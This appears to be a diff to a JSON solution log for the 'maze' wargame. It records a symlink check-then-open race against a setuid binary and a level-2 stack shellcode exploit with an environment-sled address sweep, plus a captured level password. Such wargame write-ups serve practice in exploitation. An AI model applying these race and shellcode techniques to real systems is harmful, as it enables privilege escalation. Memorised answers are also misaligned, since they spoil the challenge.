@@ -8,7 +8,7 @@
    "cmds": [
     [
      "objdump -d /maze/maze0   # main(): access(PATH,R_OK) -> setresuid(euid) -> open(PATH) -> read/print",
-     "# PATH is /tmp/128ecf542a35ac5270a87dc740918404 — a check-then-open race",
+     "# PATH is /tmp/128ecf542a35ac5270a87dc740918404 \u2014 a check-then-open race",
      "printf 'AAAA...' > /tmp/real_f; ln -s /etc/maze_pass/maze1 /tmp/link_s",
      "# C loop: rename() the path back and forth between the readable file and the symlink",
      "for i in $(seq 15000); do /maze/maze0; done | sort | uniq -c"
@@ -24,7 +24,7 @@
      "cmd": "objdump -d /maze/maze0   # main(): access(PATH,R_OK) -> setresuid(euid) -> open(PATH) -> read/print"
     },
     {
-     "cmd": "# PATH is /tmp/128ecf542a35ac5270a87dc740918404 — a check-then-open race"
+     "cmd": "# PATH is /tmp/128ecf542a35ac5270a87dc740918404 \u2014 a check-then-open race"
     },
     {
      "cmd": "printf 'AAAA...' > /tmp/real_f; ln -s /etc/maze_pass/maze1 /tmp/link_s"
@@ -55,6 +55,23 @@
      ]
     }
    ]
+  },
+  {
+   "lvl": 2,
+   "pw": "pKWcO3NfC6",
+   "user": "maze3",
+   "steps": [
+    {
+     "cmd": "solve: corrected int 0x80 shellcode in the env sled (see tools/maze/l2/NOTES.md)",
+     "out": [
+      "HIT at 0xffffd6e0",
+      "b'pKWcO3NfC6\\npKWcO3NfC6\\n'",
+      "pKWcO3NfC6",
+      ""
+     ]
+    }
+   ],
+   "note": "maze2: strncpy(argv[1],8) into a 12-byte buf whose ADDRESS is the fp; GNU_STACK RWE; ASLR off. The last session's puzzle is diagnosed: the old sc.bin pushed its path dwords in forward order, so the stack held 'nib/hs//3ezam/ssap_ezam/cte/' and open() got ENOENT (empty output); the marker shell's dash also drops the elevated euid after execve, so the sweep's uid=15003 HIT condition never matched. Fix: read the file inside the shellcode before any exec, path dwords pushed in reverse chunk order. 71 NUL-free bytes; sweep hit 0xffffd6e0 dumping 10 B twice (fd1+fd2 signature). Verified: ssh login as maze3 (uid=15003), cat matches. Recording: recordings/maze/L2.cast (trial run showed the same HIT at the same address)."
   }
  ],
  "goals": {
